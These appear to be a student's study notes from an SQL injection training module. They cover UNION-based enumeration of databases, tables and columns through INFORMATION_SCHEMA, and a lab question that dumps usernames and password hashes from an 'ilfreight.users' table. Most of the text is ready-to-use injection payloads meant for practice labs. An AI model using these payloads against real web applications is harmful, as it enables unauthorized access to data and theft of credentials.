## ID
534

## Module
SQL Injection Fundamentals

## Kind
notes

## Title
Section 13 — Database Enumeration

## Description
Enumerate databases, tables, and columns through INFORMATION_SCHEMA using union injection, then dump credentials and sensitive data from discovered tables.

## Tags
sqli, union-injection, information-schema, database-enumeration, data-extraction

## Commands
- cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
- cn' UNION select 1,database(),2,3-- -
- cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<DB>'-- -
- cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<TABLE>'-- -
- cn' UNION select 1,<COL1>,<COL2>,4 from <DB>.<TABLE>-- -

## What This Section Covers
Once you have union injection working, you need to know what to ask the database. INFORMATION_SCHEMA is a built-in metadata database that tells you every database, table, and column on the server. The enumeration flow is: list databases → pick interesting ones → list their tables → list columns in juicy tables → dump the data.

## Methodology
1. **Fingerprint the DBMS** — Inject `@@version` to confirm MySQL/MariaDB. Other tests: `POW(1,1)` for numeric output, `SLEEP(5)` for blind.
2. **List all databases** — `UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`. Ignore default DBs (mysql, information_schema, performance_schema, sys).
3. **Find current database** — `UNION select 1,database(),2,3-- -`.
4. **List tables in target DB** — `UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<DB>'-- -`.
5. **List columns in target table** — `UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<TABLE>'-- -`.
6. **Dump the data** — `UNION select 1,username,password,4 from <DB>.<TABLE>-- -`. Use dot notation if querying a different DB than the current one.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Password hash for 'newuser' in ilfreight.users | *(paste hash here)* | `cn' UNION select 1,username,password,4 from ilfreight.users-- -` |

## Key Takeaways
- INFORMATION_SCHEMA is your map of the entire database server — databases, tables, columns, everything.
- Enumeration flow: SCHEMATA (databases) → TABLES (tables) → COLUMNS (columns) → dump data.
- Use `database()` to find which DB the app is currently using.
- Use dot notation (`dev.credentials`) to query tables in a different database than the current one.
- Always filter with `WHERE table_schema='x'` or `WHERE table_name='x'` to avoid drowning in results from all databases.
- Default MySQL databases (mysql, information_schema, performance_schema, sys) are rarely interesting — skip them.

## Gotchas
- Forgetting dot notation when querying a table in another database — `SELECT from credentials` only works if you're already in that DB.
- The `WHERE` filter uses string comparison, so table/database names are case-sensitive on Linux systems.
- Some columns may have the same name across different tables — always pair `table_name` with `table_schema` to be precise.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|sql-injection-fundamentals]]  
← [[12-union-injection]] | [[15-writing-files]] →
<!-- AUTO-LINKS-END -->
